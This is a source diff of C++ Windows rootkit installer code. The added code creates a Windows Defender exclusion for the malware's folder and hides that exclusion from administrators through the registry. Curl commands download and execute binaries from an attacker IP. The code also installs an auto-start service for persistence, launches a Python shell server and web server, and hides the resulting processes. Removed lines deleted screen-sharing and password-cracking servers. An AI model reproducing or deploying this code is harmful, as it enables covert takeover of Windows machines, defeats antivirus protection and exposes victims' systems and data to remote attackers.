@@ -271,11 +271,66 @@ ULONG GeneralHelpers::CalculateAddressValue(char* IpAddress) {
 }
 
 
+BOOL GeneralHelpers::IsValidIp(char* Address) {
+    DWORD CurrChunkValue = 0;
+    if (Address == NULL || GeneralHelpers::CountOccurrences(Address, '.') != 3) {
+        return FALSE;
+    }
+
+    for (int i = 0; i < strlen(Address); i++) {
+        if (Address[i] != '.') {
+            if (isdigit(Address[i]) == 0 && Address[i]) {
+                return FALSE;
+            }
+            CurrChunkValue *= 10;
+            CurrChunkValue += (Address[i] - 0x30);
+        }
+        else {
+            if (!(CurrChunkValue >= 0 && CurrChunkValue <= 255)) {
+                return FALSE;
+            }
+            CurrChunkValue = 0;
+        }
+    }
+    return TRUE;
+}
+
+
+DWORD RootkitInstall::ExcludeRootkitFiles() {
+    HKEY RegistryKey = NULL;
+    DWORD KeyValue = 1;
+    LSTATUS Status = ERROR_SUCCESS;
+
+
+    // Create exclusion for virus files:
+    if (system("powershell -inputformat none -outputformat none -NonInteractive -Command"
+        " Add-MpPreference -ExclusionPath \"C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\"") == -1) {
+        return 1;
+    }
+
+
+    // Hide exclusions:
+    Status = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+        "Software\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &RegistryKey);
+    if (Status != ERROR_SUCCESS) {
+        return Status;
+    }
+    Status = RegSetValueExA(RegistryKey, "HideExclusionsFromLocalAdmins", 0, REG_DWORD,
+        (const BYTE*)&KeyValue, sizeof(KeyValue));
+    if (Status != ERROR_SUCCESS) {
+        RegCloseKey(RegistryKey);
+        return Status;
+    }
+    RegCloseKey(RegistryKey);
+    return 0;
+}
+
+
 int RootkitInstall::VerifyDependencies(const char* AttackerIp) {
-    const char* FileCommands[] = { "if not exist C:\\nosusfolder\\verysus mkdir C:\\nosusfolder\\verysus && ",
-        "curl http://~:8080/WebScraper/x64/Release/WebScraper.exe --output C:\\nosusfolder\\verysus\\WebScraper.exe && ",
-        "curl http://~:8080/rootkit_catalog.txt --output C:\\nosusfolder\\verysus\\rootkit_catalog.txt && ",
-        "C:\\nosusfolder\\verysus\\WebScraper.exe C:\\nosusfolder\\verysus\\rootkit_catalog.txt ~" };
+    const char* FileCommands[] = { "if not exist C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5 mkdir C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5 && ",
+        "curl http://~:8080/WebScraper/x64/Release/WebScraper.exe --output C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\WebScraper.exe && ",
+        "curl http://~:8080/rootkit_catalog.txt --output C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\rootkit_catalog.txt && ",
+        "C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\WebScraper.exe C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\rootkit_catalog.txt ~" };
 
     const char* ReplaceArr[1] = { AttackerIp };
     const char* SymbolsArr = "~";
@@ -292,7 +347,7 @@ BOOL WINAPI RootkitInstall::CtrlHandler(DWORD ControlType) {
     case CTRL_SHUTDOWN_EVENT: 
         system("sc stop RootAuto");
         system("sc delete RootAuto");
-        system("sc create RootAuto type=own start=auto binPath=\"C:\\nosusfolder\\verysus\\AutoStart.exe\"");
+        system("sc create RootAuto type=own start=auto binPath=\"C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\AutoStart.exe\"");
         system("echo handler triggered > c:\\handler.txt");
         return TRUE;
     default:
@@ -322,6 +377,85 @@ RETURN_LAST RootkitInstall::RealTime(BOOL IsDisable) {
 }
 
 
+char* RootkitInstall::ExtractGateways(char* IpConfigOutput) {
+    SIZE_T NextGatewayOffset = 0;
+    ULONG64 CurrentAddressSize = 0;
+    ULONG64 OccurenceOffset = 0;
+    ULONG64 GatewayBufferSize = 0;
+    char CurrentAddress[MAX_PATH] = { 0 };
+    char* GatewayBuffer = NULL;
+    char* TemporaryBuffer = NULL;
+    const char* GatewayIdentifier = "Default Gateway . . . . . . . . . : ";
+    std::string StringOutput(IpConfigOutput);
+    if (IpConfigOutput == NULL) {
+        return NULL;
+    }
+
+    NextGatewayOffset = StringOutput.find(GatewayIdentifier, 0);
+    while (NextGatewayOffset != std::string::npos) {
+        OccurenceOffset = NextGatewayOffset + strlen(GatewayIdentifier);
+        if (StringOutput.c_str()[OccurenceOffset] == '\r' &&
+            StringOutput.c_str()[OccurenceOffset + 1] == '\n') {
+            goto NextGateway;  // No gateway address specified
+        }
+
+        // Copy current address:
+        for (CurrentAddressSize = 0; !(StringOutput.c_str()[OccurenceOffset + CurrentAddressSize] == '\r' &&
+            StringOutput.c_str()[OccurenceOffset + CurrentAddressSize + 1] == '\n'); CurrentAddressSize++) {
+            CurrentAddress[CurrentAddressSize] = StringOutput.c_str()[OccurenceOffset + CurrentAddressSize];
+        }
+        CurrentAddress[CurrentAddressSize] = '\0';
+
+
+        // Only handle valid IPv4 addresses:
+        if (GeneralHelpers::IsValidIp(CurrentAddress)) {
+            if (GatewayBuffer == NULL) {
+                GatewayBuffer = (char*)malloc(CurrentAddressSize + 1);  // Always null terminate
+                if (GatewayBuffer == NULL) {
+                    return NULL;
+                }
+                RtlCopyMemory(GatewayBuffer, CurrentAddress, CurrentAddressSize + 1);
+            }
+            else {
+                TemporaryBuffer = (char*)malloc(strlen(GatewayBuffer) + CurrentAddressSize + 2);  // +2 for null terminator and '~'
+                if (TemporaryBuffer == NULL) {
+                    free(GatewayBuffer);
+                    return NULL;
+                }
+                RtlCopyMemory(TemporaryBuffer, GatewayBuffer, strlen(GatewayBuffer));
+                TemporaryBuffer[strlen(GatewayBuffer)] = '~';
+                RtlCopyMemory(TemporaryBuffer + strlen(GatewayBuffer) + 1, CurrentAddress,
+                    CurrentAddressSize);
+                TemporaryBuffer[strlen(GatewayBuffer) + CurrentAddressSize + 1] = '\0';
+                free(GatewayBuffer);
+                GatewayBuffer = TemporaryBuffer;
+            }
+
+        }
+    NextGateway:
+        NextGatewayOffset = StringOutput.find(GatewayIdentifier, NextGatewayOffset + strlen(GatewayIdentifier));
+    }
+    return GatewayBuffer;
+}
+
+
+char* RootkitInstall::GetGatewayList() {
+    HANDLE FileHandle = INVALID_HANDLE_VALUE;
+    ULONG64 FileDataSize = 0;
+    char* FileData = NULL;
+    char* FilteredData = NULL;
+    system("ipconfig /all > IpConfigOutput");
+    if (RequestHelpers::FileOperation((char*)"IpConfigOutput", &FileHandle, (PVOID*)&FileData, &FileDataSize, FALSE, TRUE) != 0 ||
+        FileHandle == NULL) {
+        return NULL;
+    }
+    FilteredData = RootkitInstall::ExtractGateways(FileData);
+    free(FileData);
+    system("del /s /q IpConfigOutput");
+    return FilteredData;
+}
+
+
 BOOL RequestHelpers::ValidateInfoTypeString(const char* InfoType) {
     if (strlen(InfoType) > 5 || strlen(InfoType) == 0) {
         return FALSE;
@@ -339,6 +473,7 @@ BOOL RequestHelpers::ValidateInfoTypeString(const char* InfoType) {
 
 void RequestHelpers::LogMessage(const char* Message, LogFile* MediumLog, BOOL IsError, int ErrorCode) {
     printf(Message);
+    /*
     if (MediumLog != NULL) {
         if (IsError) {
             if (ErrorCode == 0) {
@@ -352,6 +487,7 @@ void RequestHelpers::LogMessage(const char* Message, LogFile* MediumLog, BOOL Is
             MediumLog->WriteLog((PVOID)Message, strlen(Message) + 1);  // Also write null terminator
         }
     }
+    */
 }
 
 
@@ -361,7 +497,7 @@ BOOL RequestHelpers::ShouldQuit() {
 }
 
 
-int RequestHelpers::FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* FileDataSize, BOOL IsWrite) {
+int RequestHelpers::FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* FileDataSize, BOOL IsWrite, BOOL ShouldNullTerm) {
     DWORD OperationOutput = 0;
     if (FileHandle == NULL || FilePath == NULL || FileData == NULL || FileDataSize == NULL) {
         return -1;
@@ -382,7 +518,7 @@ int RequestHelpers::FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* Fil
         CloseHandle(*FileHandle);
         return 2;  // File size = 0
     }
-    *FileData = malloc(*FileDataSize);
+    *FileData = malloc(*FileDataSize + ShouldNullTerm);  // If null terminated: needs +1 character (TRUE = 1)
     if (*FileData == NULL) {
         CloseHandle(*FileHandle);
         return 3;  // Malloc failed
@@ -394,6 +530,9 @@ int RequestHelpers::FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* Fil
         CloseHandle(*FileHandle);
         free(*FileData);
         return 4;  // Actual operation failed
+    }
+    if (ShouldNullTerm) {
+        ((char*)(*FileData))[*FileDataSize] = '\0';
     }
     CloseHandle(*FileHandle);
     return 0;
@@ -443,10 +582,10 @@ DWORD MajorOperation::ConnectToNamedPipe(HANDLE* PipeHandle, LogFile* MediumLog,
         LastError = GetLastError();
         if (LastError == ERROR_PIPE_CONNECTED) {
             *IsValidPipe = TRUE;
-            RequestHelpers::LogMessage("MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", MediumLog, FALSE, 0);
+            RequestHelpers::LogMessage("MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", NULL, FALSE, 0);
         }
         else {
-            RequestHelpers::LogMessage("MainMedium pipe - error while connecting to pipe\n", MediumLog, TRUE, LastError);
+            RequestHelpers::LogMessage("MainMedium pipe - error while connecting to pipe\n", NULL, TRUE, LastError);
             if (*PipeHandle != INVALID_HANDLE_VALUE) {
                 CloseHandle(*PipeHandle);
                 *PipeHandle = INVALID_HANDLE_VALUE;
@@ -454,7 +593,7 @@ DWORD MajorOperation::ConnectToNamedPipe(HANDLE* PipeHandle, LogFile* MediumLog,
         }
     }
     else {
-        RequestHelpers::LogMessage("MainMedium pipe - driver connected to pipe like expected\n", MediumLog, FALSE, 0);
+        RequestHelpers::LogMessage("MainMedium pipe - driver connected to pipe like expected\n", NULL, FALSE, 0);
     }
     return LastError;
 }
@@ -463,20 +602,12 @@ DWORD MajorOperation::ConnectToNamedPipe(HANDLE* PipeHandle, LogFile* MediumLog,
 void MajorOperation::ClientServiceThread(PVOID ServiceParameters) {
     switch ((ULONG64)ServiceParameters) {
     case 0x1000:
-        system("cd C:\\ && C:\\nosusfolder\\verysus\\MinPython\\Scripts\\python.exe -m http.server 8050"); break;
+        system("cd C:\\ && C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython\\Scripts\\python.exe -m http.server 8050"); break;
     
-    case 0x2000:
-        system("C:\\nosusfolder\\verysus\\MinPython\\Scripts\\python.exe "
-            "C:\\nosusfolder\\verysus\\ExtraTools\\ScreenShare\\screenshare.py -p 8070"); break;
-
     case 0x4000:
-        system("C:\\nosusfolder\\verysus\\MinPython\\Scripts\\python.exe "
-            "C:\\nosusfolder\\verysus\\ExtraTools\\Shell\\ShellServer.py"); break;
-    
-    case 0x8000:
-        system("C:\\nosusfolder\\verysus\\MinPython\\Scripts\\python.exe "
-            "C:\\nosusfolder\\verysus\\ExtraTools\\Cracking\\CrackServer.py"); break;
-    
+        system("C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython\\Scripts\\python.exe "
+            "C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\ExtraTools\\Shell\\ShellServer.py"); break;
+
     default:
         break;
     }
@@ -493,14 +624,14 @@ BOOL MajorOperation::InitializeClientServices() {
 
 
     // Install python quietly if not installed already:
-    if (system("C:\\nosusfolder\\verysus\\MinPython\\pythoninstaller.exe /quiet") == -1) {
+    if (system("C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython\\pythoninstaller.exe /quiet") == -1) {
         return FALSE;
     }
 
 
     // Unzip minimal-python.zip and start the web server:
-    if (system("cd C:\\nosusfolder\\verysus\\MinPython && "
-        "tar -xf C:\\nosusfolder\\verysus\\MinPython\\minpython.zip") == -1) {
+    if (system("cd C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython && "
+        "tar -xf C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython\\minpython.zip") == -1) {
         return FALSE;
     }
     CurrentThreadHandle = GeneralHelpers::StartThread(&MajorOperation::ClientServiceThread,
@@ -509,33 +640,10 @@ BOOL MajorOperation::InitializeClientServices() {
         return FALSE;
     }
 
-    
-    // Unzip the screenshare files and run them with python:
-    //if (system("tar -xf C:\\nosusfolder\\verysus\\ExtraTools\\ScreenShare\\screenshare.zip") == -1) {
-    //    return FALSE;
-    //}
-    CurrentThreadHandle = GeneralHelpers::StartThread(&MajorOperation::ClientServiceThread,
-        (PVOID)0x2000);
-    if (CurrentThreadHandle == INVALID_HANDLE_VALUE) {
-        return FALSE;
-    }
-
 
     // Activate shell server:
     CurrentThreadHandle = GeneralHelpers::StartThread(&MajorOperation::ClientServiceThread,
         (PVOID)0x4000);
-    if (CurrentThreadHandle == INVALID_HANDLE_VALUE) {
-        return FALSE;
-    }
-
-
-    // Extract cracking tool and activate the cracking server:
-    if (system("cd C:\\nosusfolder\\verysus\\ExtraTools\\Cracking && "
-        "tar -xf C:\\nosusfolder\\verysus\\ExtraTools\\Cracking\\crack.zip") == -1) {
-        return FALSE;
-    }
-    CurrentThreadHandle = GeneralHelpers::StartThread(&MajorOperation::ClientServiceThread,
-        (PVOID)0x8000);
     if (CurrentThreadHandle == INVALID_HANDLE_VALUE) {
         return FALSE;
     }
@@ -549,8 +657,8 @@ BOOL MajorOperation::HideClientServices(HANDLE* PipeHandle, LogFile* MediumLog, 
     const char* ProcessToHide = "python.exe";
 
 
-    // Hide 8 python programs (shell,webserver,cracking and screenshare * 2 as 2 instances are launched):
-    for (int PythonHideCount = 0; PythonHideCount < 8; PythonHideCount++) {
+    // Hide 4 python programs (shell,webserver * 2 as 2 instances are launched):
+    for (int PythonHideCount = 0; PythonHideCount < 4; PythonHideCount++) {
         if (RequestHelpers::ResolvePID((char*)ProcessToHide, &RootkInst.MainPID) != successful) {
             return FALSE;
         }
